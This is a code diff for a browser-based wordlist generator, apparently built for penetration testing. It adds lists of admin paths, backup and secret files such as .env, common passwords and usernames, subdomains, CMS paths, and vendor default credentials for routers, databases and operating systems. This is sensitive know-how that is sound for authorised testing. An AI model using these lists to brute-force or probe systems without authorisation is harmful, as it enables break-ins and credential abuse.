-        localStorage.setItem('wordlist_arsenal_history', JSON.stringify(this.generationHistory));
-    }
-
-    loadStats() {
-        const saved = localStorage.getItem('wordlist_arsenal_stats');
-        if (saved) {
-            this.stats = { ...this.stats, ...JSON.parse(saved) };
-        }
-        
-        const savedHistory = localStorage.getItem('wordlist_arsenal_history');
-        if (savedHistory) {
-            this.generationHistory = JSON.parse(savedHistory);
-        }
-    }
-
-    formatBytes(bytes) {
-        if (bytes === 0) return '0 B';
-        const k = 1024;
-        const sizes = ['B', 'KB', 'MB', 'GB'];
-        const i = Math.floor(Math.log(bytes) / Math.log(k));
-        return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
-    }
-
-    regenerateFromHistory(id) {
-        const item = this.generationHistory.find(h => h.id === id);
-        if (item) {
-            this.switchTab('generators');
-            this.switchGenerator(item.generator);
-            this.showToast('Info', `Switched to ${item.generator} generator`, 'info');
-        }
-    }
-
-    deleteHistoryItem(id) {
-        this.generationHistory = this.generationHistory.filter(h => h.id !== id);
-        this.updateHistoryDisplay();
-        this.saveHistory();
-        this.showToast('Success', 'History item deleted', 'success');
+function loadFromHistory(index) {
+    const item = generationHistory[index];
+    if (item && item.wordlist) {
+        currentWordlist = item.wordlist;
+        displayResults(currentWordlist, `From History: ${item.type}`);
     }
 }
 
-// Initialize the application when DOM is loaded
-document.addEventListener('DOMContentLoaded', () => {
-    window.wordlistArsenal = new WordlistArsenal();
-});
+function updateStats() {
+    document.getElementById('totalGenerated').textContent = appStats.totalGenerated.toLocaleString();
+    document.getElementById('totalSessions').textContent = appStats.totalSessions.toLocaleString();
+    document.getElementById('totalDownloads').textContent = appStats.totalDownloads.toLocaleString();
+}
+
+function saveToLocalStorage() {
+    localStorage.setItem('wordlistArsenalHistory', JSON.stringify(generationHistory));
+    localStorage.setItem('wordlistArsenalStats', JSON.stringify(appStats));
+}
+
+function loadFromLocalStorage() {
+    const savedHistory = localStorage.getItem('wordlistArsenalHistory');
+    const savedStats = localStorage.getItem('wordlistArsenalStats');
+    
+    if (savedHistory) {
+        generationHistory = JSON.parse(savedHistory);
+        updateHistoryDisplay();
+    }
+    
+    if (savedStats) {
+        const stats = JSON.parse(savedStats);
+        appStats.totalGenerated = stats.totalGenerated || 0;
+        appStats.totalDownloads = stats.totalDownloads || 0;
+        updateStats();
+    }
+}
+
+function showToast(message, type = 'info') {
+    const toastContainer = document.getElementById('toastContainer');
+    const toast = document.createElement('div');
+    toast.className = `toast ${type}`;
+    toast.textContent = message;
+    
+    toastContainer.appendChild(toast);
+    
+    setTimeout(() => {
+        toast.remove();
+    }, 3000);
+}
+
+function showHelp() {
+    document.getElementById('helpModal').classList.add('active');
+}
+
+function hideHelp() {
+    document.getElementById('helpModal').classList.remove('active');
+}
+
+function handleKeyboardShortcuts(event) {
+    if (event.ctrlKey || event.metaKey) {
+        switch(event.key) {
+            case 'c':
+                if (event.target.tagName !== 'INPUT' && event.target.tagName !== 'TEXTAREA') {
+                    event.preventDefault();
+                    copyToClipboard();
+                }
+                break;
+            case 's':
+                event.preventDefault();
+                downloadWordlist();
+                break;
+            case 'h':
+                event.preventDefault();
+                showHelp();
+                break;
+        }
+    }
+    
+    if (event.key === 'Escape') {
+        hideHelp();
+    }
+}
+
+// Wordlist Data Sources
+function getCommonDirectories() {
+    return [
+        'admin', 'administrator', 'wp-admin', 'wp-content', 'wp-includes',
+        'login', 'dashboard', 'panel', 'control', 'manage', 'manager',
+        'assets', 'css', 'js', 'javascript', 'images', 'img', 'uploads', 'files',
+        'backup', 'backups', 'bak', 'old', 'archive', 'archives',
+        'config', 'configuration', 'settings', 'setup', 'install', 'installation',
+        'test', 'testing', 'dev', 'development', 'staging', 'demo', 'preview',
+        'api', 'apis', 'v1', 'v2', 'v3', 'rest', 'graphql', 'soap', 'webhook',
+        'public', 'private', 'secure', 'protected', 'restricted', 'internal',
+        'temp', 'tmp', 'cache', 'logs', 'log', 'debug', 'error', 'errors',
+        'docs', 'documentation', 'help', 'support', 'wiki', 'manual',
+        'blog', 'news', 'forum', 'community', 'user', 'users', 'profile',
+        'account', 'accounts', 'member', 'members', 'client', 'customer',
+        'shop', 'store', 'cart', 'checkout', 'payment', 'order', 'orders',
+        'search', 'results', 'browse', 'category', 'categories', 'product',
+        'download', 'downloads', 'file', 'upload', 'media', 'gallery',
+        'home', 'index', 'main', 'default', 'welcome', 'about', 'contact',
+        'lib', 'library', 'libraries', 'vendor', 'vendors', 'third-party',
+        'plugins', 'plugin', 'modules', 'module', 'components', 'component',
+        'themes', 'theme', 'templates', 'template', 'layouts', 'layout',
+        'includes', 'include', 'common', 'shared', 'utils', 'utilities',
+        'scripts', 'script', 'style', 'styles', 'stylesheet', 'stylesheets',
+        'fonts', 'font', 'icons', 'icon', 'graphics', 'resources',
+        'data', 'database', 'db', 'sql', 'json', 'xml', 'csv',
+        'export', 'import', 'sync', 'backup', 'restore', 'migrate',
+        'tools', 'tool', 'admin-tools', 'utilities', 'helper', 'helpers',
+        'reports', 'report', 'analytics', 'stats', 'statistics', 'metrics',
+        'monitoring', 'monitor', 'health', 'status', 'ping', 'check',
+        'mail', 'email', 'smtp', 'pop', 'imap', 'webmail', 'newsletter',
+        'security', 'auth', 'authentication', 'authorization', 'oauth',
+        'token', 'tokens', 'session', 'sessions', 'cookie', 'cookies',
+        'ssl', 'tls', 'https', 'cert', 'certificate', 'certificates',
+        'mobile', 'app', 'apps', 'application', 'applications', 'service',
+        'services', 'worker', 'workers', 'job', 'jobs', 'queue', 'cron',
+        'cdn', 'static', 'assets-cdn', 'media-cdn', 'img-cdn', 'js-cdn',
+        'staging-api', 'dev-api', 'test-api', 'beta-api', 'alpha-api',
+        'cms', 'content', 'pages', 'page', 'posts', 'post', 'articles',
+        'editor', 'edit', 'create', 'new', 'add', 'delete', 'remove',
+        'update', 'modify', 'change', 'save', 'submit', 'form', 'forms',
+        'ajax', 'async', 'xhr', 'fetch', 'request', 'response', 'callback',
+        'embed', 'widget', 'widgets', 'iframe', 'frame', 'popup', 'modal'
+    ];
+}
+
+function getAdminPaths() {
+    return [
+        'admin.php', 'admin.html', 'admin.asp', 'admin.aspx',
+        'administrator.php', 'administrator.html', 'administrator.asp',
+        'login.php', 'login.html', 'login.asp', 'login.aspx',
+        'cp.php', 'cp.html', 'controlpanel.php', 'control.php',
+        'wp-admin/', 'wp-login.php', 'wp-admin.php',
+        'admin/', 'admin/index.php', 'admin/login.php',
+        'manager/', 'management/', 'adm/', 'admins/',
+        'administrator/', 'moderator/', 'webadmin/',
+        'adminarea/', 'bb-admin/', 'adminLogin/',
+        'admin_area/', 'panel-administracion/', 'instadmin/',
+        'memberadmin/', 'administratorlogin/', 'adm/',
+        'admin/account.php', 'admin/index.html', 'admin/login.html',
+        'admin/admin.html', 'admin_area/admin.html', 'admin_area/login.html',
+        'siteadmin/', 'siteadmin/index.php', 'siteadmin/login.php'
+    ];
+}
+
+function getBackupFiles() {
+    return [
+        'backup.zip', 'backup.tar.gz', 'backup.sql', 'backup.txt',
+        'database.sql', 'db.sql', 'dump.sql', 'data.sql',
+        'site.zip', 'website.zip', 'web.tar.gz', 'www.zip',
+        'old.zip', 'archive.zip', 'files.zip', 'temp.zip',
+        'backup.tar', 'backup.rar', 'backup.7z', 'backup.gz',
+        'config.bak', 'config.old', 'config.backup', 'config.save',
+        'settings.bak', 'settings.old', 'wp-config.php.bak',
+        'database.backup', 'db.backup', 'mysql.backup',
+        'copy.txt', 'orig.txt', 'original.txt', 'backup.php'
+    ];
+}
+
+function getConfigFiles() {
+    return [
+        'config.php', 'config.inc.php', 'config.inc', 'configuration.php',
+        'wp-config.php', 'wp-config.inc', 'settings.php', 'settings.inc',
+        'database.php', 'db.php', 'connect.php', 'connection.php',
+        'constants.php', 'defines.php', 'global.php', 'globals.php',
+        'config.xml', 'config.json', 'config.ini', 'config.yaml',
+        'settings.xml', 'settings.json', 'settings.ini', 'settings.yaml',
+        'app.config', 'web.config', 'application.config', 'site.config',
+        'config.txt', 'config.cfg', 'config.conf', 'configuration.txt',
+        'env', '.env', '.env.local', '.env.production', '.env.development',
+        'secrets', '.secrets', 'credentials', '.credentials'
+    ];
+}
+
+function generateCommonPasswords() {
+    return [
+        // Most common passwords
+        'password', '123456', '123456789', 'qwerty', 'abc123',
+        'password1', 'admin', 'letmein', 'welcome', '1234567890',
+        'Password', 'PASSWORD', 'password123', 'admin123', 'root',
+        'toor', 'pass', 'test', 'guest', 'user', 'demo', 'sample',
+        '12345', '1234567', '12345678', '123456789', '1234567890',
+        
+        // Keyboard patterns
+        'qwerty123', 'asdfgh', 'zxcvbn', 'poiuyt', 'mnbvcx',
+        'qwertyuiop', 'asdfghjkl', 'zxcvbnm', '1qaz2wsx', 'qazwsx',
+        'qweasd', 'qweasdzxc', 'adgjmptw', '1q2w3e4r', '1q2w3e',
+        
+        // Popular names and words
+        'dragon', 'monkey', 'football', 'baseball', 'soccer',
+        'master', 'shadow', 'jordan', 'superman', 'batman',
+        'trustno1', 'iloveyou', 'princess', 'rockyou', 'sunshine',
+        'charlie', 'daniel', 'robert', 'jessica', 'matthew',
+        'michael', 'jennifer', 'william', 'ashley', 'nicole',
+        
+        // Common variations
+        'admin1234', 'password12', 'password1234', 'pass123',
+        'test123', 'user123', 'guest123', 'demo123', 'temp123',
+        'changeme', 'change', 'default', 'secret', 'private',
+        'system', 'service', 'manager', 'operator', 'supervisor',
+        
+        // Date patterns
+        '2024', '2023', '2022', '2021', '2020', '1234',
+        '01012024', '12345678', '87654321', '11111111',
+        '00000000', '12341234', '56785678', '90909090',
+        
+        // Special character patterns
+        'password!', 'admin!', 'test!', '123456!', 'qwerty!',
+        'password@', 'admin@', 'test@', '123456@', 'qwerty@',
+        'password#', 'admin#', 'test#', '123456#', 'qwerty#',
+        'password$', 'admin$', 'test$', '123456$', 'qwerty$',
+        
+        // Technology related
+        'linux', 'windows', 'ubuntu', 'debian', 'centos',
+        'mysql', 'oracle', 'postgres', 'mongodb', 'redis',
+        'apache', 'nginx', 'tomcat', 'jetty', 'iis',
+        'docker', 'kubernetes', 'jenkins', 'gitlab', 'github',
+        
+        // Company/brand names
+        'cisco', 'netgear', 'linksys', 'dlink', 'tplink',
+        'microsoft', 'google', 'amazon', 'facebook', 'twitter',
+        'apple', 'samsung', 'huawei', 'xiaomi', 'nokia',
+        
+        // Security defaults
+        'security', 'firewall', 'vpn', 'proxy', 'gateway',
+        'router', 'switch', 'bridge', 'access', 'control',
+        'monitor', 'backup', 'restore', 'update', 'patch',
+        
+        // Empty and simple
+        '', ' ', 'a', 'aa', 'aaa', 'aaaa', 'aaaaa',
+        '1', '11', '111', '1111', '11111', '111111',
+        'x', 'xx', 'xxx', 'xxxx', 'xxxxx', 'xxxxxx'
+    ];
+}
+
+function generateWebDirectories() {
+    return [
+        'admin', 'administrator', 'wp-admin', 'wp-content', 'wp-includes',
+        'login', 'dashboard', 'panel', 'control', 'manage', 'manager',
+        'assets', 'css', 'js', 'javascript', 'images', 'img', 'uploads',
+        'files', 'documents', 'downloads', 'media', 'gallery', 'photos',
+        'backup', 'backups', 'bak', 'old', 'archive', 'archives',
+        'config', 'configuration', 'settings', 'setup', 'install',
+        'test', 'testing', 'dev', 'development', 'staging', 'demo',
+        'api', 'apis', 'v1', 'v2', 'rest', 'graphql', 'soap',
+        'public', 'private', 'secure', 'protected', 'restricted',
+        'temp', 'tmp', 'cache', 'logs', 'log', 'debug', 'error'
+    ];
+}
+
+function generateCommonUsernames() {
+    return [
+        // Basic admin accounts
+        'admin', 'administrator', 'root', 'user', 'guest', 'demo',
+        'test', 'testuser', 'sample', 'example', 'default', 'sa',
+        'sysadmin', 'system', 'operator', 'manager', 'service',
+        'support', 'helpdesk', 'webmaster', 'postmaster', 'mail',
+        
+        // Web services
+        'ftp', 'www', 'web', 'apache', 'nginx', 'httpd', 'www-data',
+        'tomcat', 'jetty', 'iis', 'lighttpd', 'caddy', 'traefik',
+        
+        // Database users
+        'mysql', 'postgres', 'postgresql', 'oracle', 'mssql', 'sqlserver',
+        'db2', 'mongodb', 'mongo', 'redis', 'elastic', 'elasticsearch',
+        'cassandra', 'neo4j', 'influxdb', 'mariadb', 'sqlite',
+        
+        // Development tools
+        'jenkins', 'git', 'svn', 'gitlab', 'github', 'bitbucket',
+        'docker', 'kubernetes', 'k8s', 'ansible', 'puppet', 'chef',
+        'terraform', 'vagrant', 'bamboo', 'teamcity', 'travis',
+        
+        // Monitoring/Logging
+        'backup', 'monitoring', 'nagios', 'zabbix', 'cacti', 'grafana',
+        'kibana', 'splunk', 'elk', 'logstash', 'fluentd', 'prometheus',
+        'alertmanager', 'sensu', 'icinga', 'pandora', 'observium',
+        
+        // Network services
+        'network', 'radius', 'ldap', 'bind', 'dns', 'dhcp', 'ntp',
+        'snmp', 'tftp', 'syslog', 'proxy', 'squid', 'haproxy',
+        'nginx-proxy', 'reverse-proxy', 'load-balancer', 'firewall',
+        
+        // Cloud services
+        'aws', 'azure', 'gcp', 'cloudflare', 'digitalocean', 'linode',
+        'vultr', 'heroku', 'vercel', 'netlify', 'cloud', 'ec2',
+        'lambda', 's3', 'rds', 'dynamo', 'cognito', 'iam',
+        
+        // Common first names
+        'john', 'jane', 'admin1', 'admin2', 'user1', 'user2',
+        'test1', 'test2', 'dev', 'developer', 'devops', 'ops',
+        'security', 'sec', 'audit', 'auditor', 'compliance',
+        
+        // Service accounts
+        'service-account', 'svc', 'app', 'application', 'api',
+        'worker', 'daemon', 'cron', 'scheduler', 'queue',
+        'batch', 'job', 'task', 'process', 'thread',
+        
+        // Special characters variations
+        'admin_user', 'admin-user', 'admin.user', 'test_user',
+        'test-user', 'test.user', 'guest_user', 'guest-user',
+        'guest.user', 'demo_user', 'demo-user', 'demo.user',
+        
+        // Numbers
+        'admin123', 'user123', 'test123', 'guest123', 'demo123',
+        'user001', 'user002', 'user003', 'admin001', 'admin002',
+        'test001', 'test002', 'guest001', 'guest002', 'demo001',
+        
+        // Organizational roles
+        'ceo', 'cto', 'cio', 'cso', 'manager', 'director',
+        'supervisor', 'lead', 'senior', 'junior', 'intern',
+        'contractor', 'vendor', 'external', 'consultant',
+        
+        // Empty and minimal
+        '', 'a', 'admin@', '@admin', '_admin', 'admin_',
+        '-admin', 'admin-', '.admin', 'admin.'
+    ];
+}
+
+function generateSubdomains() {
+    return [
+        // Standard web services
+        'www', 'mail', 'ftp', 'admin', 'webmail', 'secure', 'vpn',
+        'remote', 'blog', 'shop', 'store', 'forum', 'support',
+        'help', 'docs', 'wiki', 'portal', 'gateway', 'proxy',
+        
+        // API services
+        'api', 'rest', 'graphql', 'soap', 'ws', 'service',
+        'api1', 'api2', 'api-v1', 'api-v2', 'v1', 'v2', 'v3',
+        'services', 'microservice', 'webhook', 'callback',
+        
+        // Development environments
+        'test', 'dev', 'staging', 'demo', 'beta', 'alpha',
+        'sandbox', 'lab', 'playground', 'preview', 'canary',
+        'development', 'testing', 'integration', 'uat', 'qa',
+        
+        // Mobile and apps
+        'mobile', 'm', 'app', 'apps', 'ios', 'android',
+        'application', 'client', 'webapp', 'web-app',
+        
+        // Content delivery
+        'cdn', 'static', 'assets', 'media', 'images', 'img',
+        'video', 'videos', 'audio', 'download', 'downloads',
+        'files', 'backup', 'archive', 'storage', 'data',
+        
+        // Monitoring and status
+        'monitoring', 'status', 'health', 'metrics', 'logs',
+        'analytics', 'stats', 'dashboard', 'control',
+        'console', 'panel', 'manage', 'management',
+        
+        // Email services
+        'mail1', 'mail2', 'mail3', 'pop', 'imap', 'smtp',
+        'exchange', 'outlook', 'webmail1', 'webmail2',
+        'mx', 'mx1', 'mx2', 'mx3', 'autoconfig', 'autodiscover',
+        
+        // Database services
+        'db', 'database', 'mysql', 'postgres', 'mongo',
+        'redis', 'elastic', 'search', 'solr', 'sphinx',
+        'db1', 'db2', 'master', 'slave', 'replica',
+        
+        // Security services
+        'auth', 'login', 'sso', 'oauth', 'saml', 'ldap',
+        'identity', 'iam', 'security', 'firewall', 'waf',
+        'ssl', 'cert', 'ca', 'pki', 'vpn1', 'vpn2',
+        
+        // Infrastructure
+        'lb', 'load-balancer', 'proxy1', 'proxy2', 'cache',
+        'memcache', 'memcached', 'varnish', 'haproxy',
+        'nginx', 'apache', 'web1', 'web2', 'web3',
+        
+        // CI/CD and DevOps
+        'ci', 'cd', 'jenkins', 'gitlab', 'github', 'git',
+        'build', 'deploy', 'release', 'docker', 'k8s',
+        'kubernetes', 'rancher', 'nomad', 'consul',
+        
+        // Cloud services
+        'aws', 'azure', 'gcp', 'cloud', 'compute',
+        's3', 'ec2', 'lambda', 'functions', 'serverless',
+        
+        // Commerce and business
+        'shop1', 'shop2', 'cart', 'checkout', 'payment',
+        'pay', 'billing', 'invoice', 'order', 'orders',
+        'catalog', 'product', 'products', 'inventory',
+        
+        // Communication
+        'chat', 'messenger', 'slack', 'teams', 'zoom',
+        'meet', 'conference', 'video', 'voice', 'sip',
+        'pbx', 'voip', 'asterisk', 'freeswitch',
+        
+        // Social and community
+        'social', 'community', 'facebook', 'twitter',
+        'linkedin', 'instagram', 'youtube', 'reddit',
+        'discord', 'telegram', 'whatsapp',
+        
+        // Regional/Geographic
+        'us', 'eu', 'asia', 'na', 'emea', 'apac',
+        'east', 'west', 'north', 'south', 'global',
+        'local', 'regional', 'country', 'city',
+        
+        // Numbers and variations
+        '1', '2', '3', '01', '02', '03', 'a', 'b', 'c',
+        'prod', 'production', 'live', 'public', 'private',
+        'internal', 'external', 'partner', 'vendor',
+        
+        // Special purposes
+        'backup1', 'backup2', 'mirror', 'failover',
+        'disaster', 'dr', 'redundant', 'cluster',
+        'node1', 'node2', 'server1', 'server2',
+        
+        // Legacy and old
+        'old', 'legacy', 'archive1', 'archive2',
+        'historical', 'deprecated', 'sunset',
+        'maintenance', 'temp', 'temporary'
+    ];
+}
+
+function getNumericPatterns(min, max) {
+    const patterns = [];
+    for (let i = min; i <= max; i++) {
+        patterns.push('1'.repeat(i));
+        patterns.push('0'.repeat(i));
+        patterns.push('123456789'.substring(0, i));
+        patterns.push('987654321'.substring(0, i));
+    }
+    return patterns;
+}
+
+function getKeyboardPatterns() {
+    return [
+        'qwerty', 'qwertyuiop', 'asdfgh', 'asdfghjkl', 'zxcvbn', 'zxcvbnm',
+        'qwertz', 'azerty', '123qwe', 'qwe123', 'asd123', '123asd',
+        'qweasd', 'qweasdzxc', 'adgjmptw', 'aeiou', 'bcdfg'
+    ];
+}
+
+function generateDatePatterns() {
+    const patterns = [];
+    const currentYear = new Date().getFullYear();
+    
+    for (let year = 1980; year <= currentYear; year++) {
+        patterns.push(year.toString());
+        patterns.push(year.toString().slice(-2));
+    }
+    
+    for (let month = 1; month <= 12; month++) {
+        patterns.push(month.toString().padStart(2, '0'));
+        patterns.push(month.toString());
+    }
+    
+    for (let day = 1; day <= 31; day++) {
+        patterns.push(day.toString().padStart(2, '0'));
+    }
+    
+    return patterns;
+}
+
+function generateCharacterCombinations(config) {
+    const combinations = [];
+    let charset = '';
+    
+    if (config.lowercase) charset += 'abcdefghijklmnopqrstuvwxyz';
+    if (config.uppercase) charset += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+    if (config.numbers) charset += '0123456789';
+    if (config.special) charset += '!@#$%^&*()_+-=[]{}|;:,.<>?';
+    
+    // Generate limited combinations to avoid memory issues
+    for (let i = 0; i < 1000; i++) {
+        let combination = '';
+        const length = Math.floor(Math.random() * (config.maxLength - config.minLength + 1)) + config.minLength;
+        
+        for (let j = 0; j < length; j++) {
+            combination += charset[Math.floor(Math.random() * charset.length)];
+        }
+        
+        combinations.push(combination);
+    }
+    
+    return combinations;
+}
+
+function getRouterCredentials() {
+    return [
+        // Generic router defaults
+        { username: 'admin', password: 'admin', vendor: 'generic' },
+        { username: 'admin', password: 'password', vendor: 'generic' },
+        { username: 'admin', password: '1234', vendor: 'generic' },
+        { username: 'admin', password: '', vendor: 'generic' },
+        { username: 'root', password: 'root', vendor: 'generic' },
+        { username: 'administrator', password: 'administrator', vendor: 'generic' },
+        { username: 'guest', password: 'guest', vendor: 'generic' },
+        { username: 'user', password: 'user', vendor: 'generic' },
+        { username: 'admin', password: '12345', vendor: 'generic' },
+        { username: 'admin', password: '123456', vendor: 'generic' },
+        
+        // Cisco
+        { username: 'admin', password: 'cisco', vendor: 'cisco' },
+        { username: 'cisco', password: 'cisco', vendor: 'cisco' },
+        { username: 'enable', password: 'cisco', vendor: 'cisco' },
+        { username: 'admin', password: 'admin', vendor: 'cisco' },
+        { username: 'root', password: 'cisco', vendor: 'cisco' },
+        { username: 'cisco', password: 'admin', vendor: 'cisco' },
+        { username: 'admin', password: '', vendor: 'cisco' },
+        { username: 'cisco', password: '', vendor: 'cisco' },
+        
+        // Netgear
+        { username: 'admin', password: 'netgear1', vendor: 'netgear' },
+        { username: 'admin', password: 'password', vendor: 'netgear' },
+        { username: 'admin', password: 'admin', vendor: 'netgear' },
+        { username: 'admin', password: '1234', vendor: 'netgear' },
+        { username: 'admin', password: '', vendor: 'netgear' },
+        { username: 'netgear', password: 'netgear', vendor: 'netgear' },
+        
+        // Linksys
+        { username: 'admin', password: 'admin', vendor: 'linksys' },
+        { username: 'admin', password: '', vendor: 'linksys' },
+        { username: 'admin', password: 'linksys', vendor: 'linksys' },
+        { username: 'linksys', password: 'linksys', vendor: 'linksys' },
+        { username: 'admin', password: 'password', vendor: 'linksys' },
+        { username: 'root', password: 'admin', vendor: 'linksys' },
+        
+        // D-Link
+        { username: 'admin', password: '', vendor: 'dlink' },
+        { username: 'admin', password: 'admin', vendor: 'dlink' },
+        { username: 'admin', password: 'password', vendor: 'dlink' },
+        { username: 'user', password: '', vendor: 'dlink' },
+        { username: 'admin', password: 'dlink', vendor: 'dlink' },
+        
+        // TP-Link
+        { username: 'admin', password: 'admin', vendor: 'tplink' },
+        { username: 'admin', password: '', vendor: 'tplink' },
+        { username: 'admin', password: 'password', vendor: 'tplink' },
+        { username: 'admin', password: 'tplink', vendor: 'tplink' },
+        { username: 'user', password: 'user', vendor: 'tplink' },
+        
+        // Asus
+        { username: 'admin', password: 'admin', vendor: 'asus' },
+        { username: 'admin', password: '', vendor: 'asus' },
+        { username: 'admin', password: 'password', vendor: 'asus' },
+        { username: 'admin', password: 'asus', vendor: 'asus' },
+        { username: 'root', password: 'root', vendor: 'asus' },
+        
+        // Belkin
+        { username: 'admin', password: '', vendor: 'belkin' },
+        { username: 'admin', password: 'admin', vendor: 'belkin' },
+        { username: 'admin', password: 'belkin', vendor: 'belkin' },
+        { username: '', password: 'admin', vendor: 'belkin' },
+        
+        // SMC
+        { username: 'admin', password: 'smcadmin', vendor: 'smc' },
+        { username: 'admin', password: 'epicrouter', vendor: 'smc' },
+        { username: 'admin', password: 'admin', vendor: 'smc' },
+        { username: 'smc', password: 'smc', vendor: 'smc' },
+        
+        // 3Com
+        { username: 'admin', password: 'admin', vendor: '3com' },
+        { username: 'admin', password: '', vendor: '3com' },
+        { username: 'admin', password: 'comcomcom', vendor: '3com' },
+        { username: 'read', password: 'synnet', vendor: '3com' },
+        
+        // Huawei
+        { username: 'admin', password: 'admin', vendor: 'huawei' },
+        { username: 'admin', password: '', vendor: 'huawei' },
+        { username: 'root', password: 'admin', vendor: 'huawei' },
+        { username: 'admin', password: 'huawei', vendor: 'huawei' },
+        
+        // ZTE
+        { username: 'admin', password: 'admin', vendor: 'zte' },
+        { username: 'admin', password: '', vendor: 'zte' },
+        { username: 'user', password: 'user', vendor: 'zte' },
+        { username: 'admin', password: 'zte', vendor: 'zte' },
+        
+        // Mikrotik
+        { username: 'admin', password: '', vendor: 'mikrotik' },
+        { username: 'admin', password: 'admin', vendor: 'mikrotik' },
+        { username: 'admin', password: 'mikrotik', vendor: 'mikrotik' },
+        
+        // Ubiquiti
+        { username: 'ubnt', password: 'ubnt', vendor: 'ubiquiti' },
+        { username: 'admin', password: 'admin', vendor: 'ubiquiti' },
+        { username: 'root', password: 'ubnt', vendor: 'ubiquiti' },
+        
+        // Additional manufacturers
+        { username: 'admin', password: 'motorola', vendor: 'motorola' },
+        { username: 'admin', password: 'netopia', vendor: 'netopia' },
+        { username: 'admin', password: 'speedstream', vendor: 'speedstream' },
+        { username: 'admin', password: 'westell', vendor: 'westell' },
+        { username: 'admin', password: 'actiontec', vendor: 'actiontec' }
+    ];
+}
+
+function getDatabaseCredentials() {
+    return [
+        { username: 'root', password: '', vendor: 'mysql' },
+        { username: 'root', password: 'root', vendor: 'mysql' },
+        { username: 'root', password: 'password', vendor: 'mysql' },
+        { username: 'root', password: 'mysql', vendor: 'mysql' },
+        { username: 'mysql', password: 'mysql', vendor: 'mysql' },
+        { username: 'admin', password: 'admin', vendor: 'mysql' },
+        { username: 'sa', password: '', vendor: 'mssql' },
+        { username: 'sa', password: 'sa', vendor: 'mssql' },
+        { username: 'sa', password: 'password', vendor: 'mssql' },
+        { username: 'postgres', password: '', vendor: 'postgresql' },
+        { username: 'postgres', password: 'postgres', vendor: 'postgresql' },
+        { username: 'postgres', password: 'password', vendor: 'postgresql' },
+        { username: 'oracle', password: 'oracle', vendor: 'oracle' },
+        { username: 'system', password: 'oracle', vendor: 'oracle' },
+        { username: 'sys', password: 'oracle', vendor: 'oracle' }
+    ];
+}
+
+function getWebCredentials() {
+    return [
+        { username: 'admin', password: 'admin', vendor: 'generic' },
+        { username: 'admin', password: 'password', vendor: 'generic' },
+        { username: 'admin', password: '123456', vendor: 'generic' },
+        { username: 'administrator', password: 'administrator', vendor: 'generic' },
+        { username: 'root', password: 'root', vendor: 'generic' },
+        { username: 'admin', password: 'changeme', vendor: 'generic' },
+        { username: 'admin', password: 'letmein', vendor: 'generic' },
+        { username: 'guest', password: 'guest', vendor: 'generic' },
+        { username: 'user', password: 'user', vendor: 'generic' },
+        { username: 'demo', password: 'demo', vendor: 'generic' },
+        { username: 'test', password: 'test', vendor: 'generic' }
+    ];
+}
+
+function getOSCredentials() {
+    return [
+        { username: 'administrator', password: 'administrator', vendor: 'windows' },
+        { username: 'administrator', password: 'admin', vendor: 'windows' },
+        { username: 'administrator', password: 'password', vendor: 'windows' },
+        { username: 'administrator', password: '123456', vendor: 'windows' },
+        { username: 'admin', password: 'admin', vendor: 'windows' },
+        { username: 'guest', password: '', vendor: 'windows' },
+        { username: 'root', password: 'root', vendor: 'linux' },
+        { username: 'root', password: 'password', vendor: 'linux' },
+        { username: 'root', password: 'toor', vendor: 'linux' },
+        { username: 'root', password: '123456', vendor: 'linux' },
+        { username: 'admin', password: 'admin', vendor: 'linux' },
+        { username: 'user', password: 'user', vendor: 'linux' }
+    ];
+}
+
+function getRESTEndpoints() {
+    return [
+        '/api', '/api/v1', '/api/v2', '/api/v3', '/rest', '/rest/v1',
+        '/api/users', '/api/user', '/api/admin', '/api/login', '/api/auth',
+        '/api/token', '/api/tokens', '/api/session', '/api/sessions',
+        '/api/data', '/api/info', '/api/config', '/api/settings',
+        '/api/status', '/api/health', '/api/ping', '/api/version',
+        '/api/upload', '/api/download', '/api/files', '/api/documents',
+        '/api/search', '/api/query', '/api/filter', '/api/sort',
+        '/api/create', '/api/update', '/api/delete', '/api/get',
+        '/api/post', '/api/put', '/api/patch', '/api/options',
+        '/api/head', '/api/trace', '/api/connect'
+    ];
+}
+
+function getGraphQLEndpoints() {
+    return [
+        '/graphql', '/graphql/v1', '/graphql/v2', '/api/graphql',
+        '/gql', '/query', '/queries', '/mutation', '/mutations',
+        '/subscription', '/subscriptions', '/schema', '/schemas',
+        '/graphiql', '/graphql-playground', '/apollo', '/relay'
+    ];
+}
+
+function getSOAPEndpoints() {
+    return [
+        '/soap', '/soap/v1', '/soap/v2', '/api/soap', '/webservice',
+        '/webservices', '/service', '/services', '/wsdl', '/svc',
+        '/asmx', '/asmx/service', '/axis', '/axis2', '/cxf'
+    ];
+}
+
+function getWebhookEndpoints() {
+    return [
+        '/webhook', '/webhooks', '/hook', '/hooks', '/callback',
+        '/callbacks', '/notify', '/notification', '/notifications',
+        '/trigger', '/triggers', '/event', '/events', '/listener',
+        '/listeners', '/handler', '/handlers', '/receiver', '/receivers'
+    ];
+}
+
+function getWordPressPaths() {
+    return [
+        '/wp-admin/', '/wp-content/', '/wp-includes/', '/wp-login.php',
+        '/wp-config.php', '/wp-admin/admin.php', '/wp-admin/index.php',
+        '/wp-content/themes/', '/wp-content/plugins/', '/wp-content/uploads/',
+        '/wp-includes/js/', '/wp-includes/css/', '/wp-includes/images/',
+        '/xmlrpc.php', '/wp-cron.php', '/wp-mail.php', '/wp-settings.php',
+        '/wp-blog-header.php', '/wp-comments-post.php', '/wp-trackback.php',
+        '/wp-content/debug.log', '/wp-admin/install.php', '/wp-admin/setup-config.php'
+    ];
+}
+
+function getDrupalPaths() {
+    return [
+        '/admin/', '/user/', '/node/', '/sites/', '/modules/', '/themes/',
+        '/includes/', '/misc/', '/profiles/', '/scripts/', '/install.php',
+        '/update.php', '/cron.php', '/xmlrpc.php', '/authorize.php',
+        '/sites/default/', '/sites/all/', '/sites/default/files/',
+        '/sites/default/settings.php', '/sites/default/default.settings.php'
+    ];
+}
+
+function getJoomlaPaths() {
+    return [
+        '/administrator/', '/components/', '/modules/', '/plugins/',
+        '/templates/', '/media/', '/cache/', '/logs/', '/tmp/',
+        '/configuration.php', '/htaccess.txt', '/web.config.txt',
+        '/README.txt', '/LICENSE.txt', '/index.php', '/robots.txt'
+    ];
+}
+
+function getMagentoPaths() {
+    return [
+        '/admin/', '/downloader/', '/app/', '/skin/', '/js/', '/media/',
+        '/var/', '/lib/', '/shell/', '/api.php', '/cron.php', '/index.php',
+        '/app/etc/', '/app/code/', '/app/design/', '/var/log/', '/var/cache/'
+    ];
+}
+
